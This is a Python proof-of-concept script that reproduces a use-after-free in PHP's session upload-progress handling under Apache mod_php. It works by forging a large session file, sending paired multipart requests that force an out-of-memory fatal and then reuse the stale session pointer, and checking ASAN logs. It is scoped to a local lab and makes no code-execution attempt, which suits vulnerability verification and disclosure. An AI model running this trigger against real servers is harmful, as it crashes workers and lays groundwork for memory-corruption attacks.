#!/usr/bin/env python3
"""PoC runner: CVE-2026-109619 Path B, stale PS() globals (Calif; local lab only).

WHAT THIS PROVES
  Request A (producer) drives multipart parsing into an early session init
  (php_rinit_session at FILE_START binds PS(id)/PS(http_session_vars to the
  request heap) and then fatals mid-parse, so the MULTIPART_EVENT_END cleanup
  and the gated module RSHUTDOWN (PG(modules_activated)==0) never run. The
  Apache worker survives with PS(id) pointing at freed request memory.
  Request B (consumer) is a multipart body with the session-id and progress
  fields but NO file part: it reaches MULTIPART_EVENT_END without a FILE_START
  session reset, and the END cleanup calls php_session_initialize(), which
  dereferences the stale PS(id) (session.c:431) before any RINIT can reset it.

WHAT THIS DOES NOT DO
  No heap grooming, no pointer/address control, no code execution attempt.
  It needs local write access to the session save path to forge the large
  session file, so it is a lab trigger, not a remote exploit. ASAN aborts on
  the first invalid access.

Usage (against the Apache lab started by apache-lab.sh):
  POC_SESSION_DIR=... POC_ASAN_DIR=... POC_ERROR_LOG=... POC_PROCESS_PID=... \
  python3 linux/poc-pathb.py --external --port 18088 --iterations 1
"""
import argparse
import http.cookiejar
import json
import os
import re
import secrets
import signal
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from probe import multipart  # noqa: E402

REPO = Path(__file__).resolve().parents[1]
BASE = Path('/home/phplab/php-lab')
PORT = 18088
SESSION_FIELD = 'PHPSESSID'
PROGRESS_FIELD = 'PHP_SESSION_UPLOAD_PROGRESS'

# Stack frames that identify the Path B consumption site.
PATH_B_FRAMES = ('php_session_rfc1867_cleanup', 'php_session_initialize',
                 'php_session_reset_id', 'php_session_track_init',
                 'ps_files_key_exists', 'ps_files_open')


def health(port=PORT):
    try:
        with urllib.request.urlopen('http://127.0.0.1:%d/health' % port, timeout=3) as res:
            return json.load(res).get('ok') is True
    except Exception:
        return False


def snapshot_asan(asan_dir):
    return {path.name for path in Path(asan_dir).glob('asan.*') if path.is_file()}


def parse_asan(path):
    text = Path(path).read_text(errors='replace')
    if 'AddressSanitizer' not in text:
        return None
    frames = [line.strip() for line in text.splitlines() if re.match(r'\s*#\d+', line)]
    matched = sorted({name for name in PATH_B_FRAMES
                      if any(name in frame for frame in frames)})
    match = re.match(r'asan\.(\d+)', Path(path).name)
    return dict(file=str(path), asan_pid=int(match.group(1)) if match else None,
                is_uaf='heap-use-after-free' in text,
                path_b_frames=matched,
                first_frame=(frames[0] if frames else ''),
                summary=next((line for line in text.splitlines() if 'SUMMARY' in line), ''))


def wait_new_asan(asan_dir, before, timeout=8.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        for path in sorted(Path(asan_dir).glob('asan.*')):
            if path.name in before or not path.is_file():
                continue
            parsed = parse_asan(path)
            if parsed:
                return parsed
        time.sleep(0.2)
    return None


def process_alive(pid):
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def one_iteration(base_out, index, external_port):
    out = base_out / ('iter-%02d' % index)
    (out / 'sessions').mkdir(parents=True, exist_ok=True)
    (out / 'uploads').mkdir(parents=True, exist_ok=True)
    sid_big = 'pbbig' + secrets.token_hex(8)
    sid_small = 'pbsmall' + secrets.token_hex(8)
    big = 'A' * (3 * 1024 * 1024)
    session_dir = Path(os.environ.get('POC_SESSION_DIR', out / 'sessions'))
    asan_dir = Path(os.environ.get('POC_ASAN_DIR', base_out))
    error_log = Path(os.environ.get('POC_ERROR_LOG', out / 'php-error.log'))
    worker_pid = int(os.environ['POC_PROCESS_PID']) if os.environ.get('POC_PROCESS_PID') else None
    asan_before = snapshot_asan(asan_dir)
    session_dir.mkdir(parents=True, exist_ok=True)
    (session_dir / ('sess_' + sid_big)).write_text('big|s:%d:"%s";' % (len(big), big))
    (session_dir / ('sess_' + sid_small)).write_text('small|a:1:{i:0;i:7;}')
    port = external_port
    record = dict(iteration=index, worker_pid=worker_pid)

    # Warm-up identical to the proven Bug S producer shape (poc-bgserialize):
    # health x2, same-session roundtrips, one clean progress upload.
    for _ in range(2):
        health(port)
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    visits = []
    for _ in range(2):
        try:
            with opener.open('http://127.0.0.1:%d/session' % port, timeout=3) as res:
                visits.append(json.load(res).get('visits'))
        except Exception:
            visits.append(None)
    cookie_sid = next((c.value for c in jar if c.name == 'PHPSESSID'), None)
    record.update(session_roundtrip_visits=visits,
                  session_roundtrip_ok=(len(visits) == 2 and visits[0] is not None
                                        and visits[1] == visits[0] + 1))
    multipart(port, '/upload', fields=[(PROGRESS_FIELD, 'pbW')],
              file_spec=('file', 'w.bin', b'W' * (64 * 1024)), chunk_size=32768,
              chunk_delay=0.02, cookie=('PHPSESSID=' + cookie_sid) if cookie_sid else None)

    # Request A (producer): file part + progress + forged big session.
    # FILE_START early-inits the session (PS(id) bound to this request's heap),
    # the progress update re-encodes the 3MB session and OOMs mid-parse, so the
    # END callback and the gated module RSHUTDOWN are both skipped.
    req_a = multipart(port, '/upload',
                      fields=[(SESSION_FIELD, sid_big), (PROGRESS_FIELD, 'pbA')],
                      file_spec=('file', 'a.bin', b'K' * 32768))
    time.sleep(0.3)
    log_text = error_log.read_text(errors='replace') if error_log.exists() else ''
    oom = 'Allowed memory size of' in log_text
    record.update(request_a_status=req_a['status'], oom_logged=oom,
                  worker_alive_after_a=(process_alive(worker_pid) if worker_pid else None))
    if not oom:
        record.update(request_b_status=None, result='no_oom_triggered')
        return record

    # No request may run between A and B: any request reaching
    # zend_activate_modules runs the session RINIT, which resets PS(id).
    # Request B (consumer): both fields, NO file part -> END cleanup calls
    # php_session_initialize() on the stale PS(id) before any RINIT.
    req_b = None
    b_reset = False
    try:
        req_b = multipart(port, '/upload',
                          fields=[(SESSION_FIELD, sid_small), (PROGRESS_FIELD, 'pbB')],
                          file_spec=None)
    except (ConnectionResetError, BrokenPipeError, OSError):
        b_reset = True
    time.sleep(0.3)
    asan = wait_new_asan(asan_dir, asan_before)
    record.update(request_b_status=(req_b or {}).get('status'),
                  request_b_connection_reset=b_reset,
                  asan=asan,
                  asan_attribution='new_report_created_during_this_iteration',
                  worker_alive_after_b=(process_alive(worker_pid) if worker_pid else None))
    if asan and asan['is_uaf'] and asan['path_b_frames']:
        record['result'] = 'path_b_reproduced'
    elif asan and asan['is_uaf']:
        record['result'] = 'uaf_other_path'
    else:
        record['result'] = 'no_uaf_observed'
    return record


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--version', default='8.4.4')
    parser.add_argument('--iterations', type=int, default=3)
    parser.add_argument('--external', action='store_true', required=True,
                        help='target the Apache lab (apache-lab.sh) already running')
    parser.add_argument('--port', type=int, default=PORT)
    args = parser.parse_args()

    stamp = time.strftime('%Y%m%dT%H%M%S', time.gmtime()) + '-' + str(os.getpid())
    out = BASE / 'evidence' / ('poc-pathb-%s-%s' % (stamp, args.version))
    out.mkdir(parents=True)
    (out / 'env.json').write_text(json.dumps(dict(
        version=args.version, target='apache-mod_php:%d' % args.port,
        scope='local lab trigger PoC; CVE-2026-109619 Path B (stale PS globals)',
        worker_pid=os.environ.get('POC_PROCESS_PID'),
        memory_limit=os.environ.get('POC_MEMORY_LIMIT', '8M (apache-lab php.ini)'),
        safety='observation only; no exploitation attempt'), indent=2))

    results = [one_iteration(out, index, args.port)
               for index in range(1, args.iterations + 1)]
    reproduced = sum(1 for item in results if item['result'] == 'path_b_reproduced')
    summary = dict(scope='local lab trigger PoC; no exploitation attempt',
                   version=args.version, target='apache-mod_php',
                   iterations=args.iterations, reproduced=reproduced,
                   reproduction_rate=round(reproduced / args.iterations, 3),
                   results=results,
                   iterations_detail=[dict(i=r['iteration'], a=r.get('request_a_status'),
                                           worker_alive_after_a=r.get('worker_alive_after_a'),
                                           b=r.get('request_b_status'),
                                           b_reset=r.get('request_b_connection_reset'),
                                           result=r['result'],
                                           path_b_frames=(r.get('asan') or {}).get('path_b_frames'),
                                           first_frame=(r.get('asan') or {}).get('first_frame'))
                                      for r in results],
                   evidence=str(out))
    (out / 'result.json').write_text(json.dumps(summary, indent=2))
    print(json.dumps({k: summary[k] for k in ('version', 'iterations', 'reproduced',
                                              'reproduction_rate', 'evidence')}, indent=2))
    return 0 if reproduced == args.iterations else 1


if __name__ == '__main__':
    sys.exit(main())
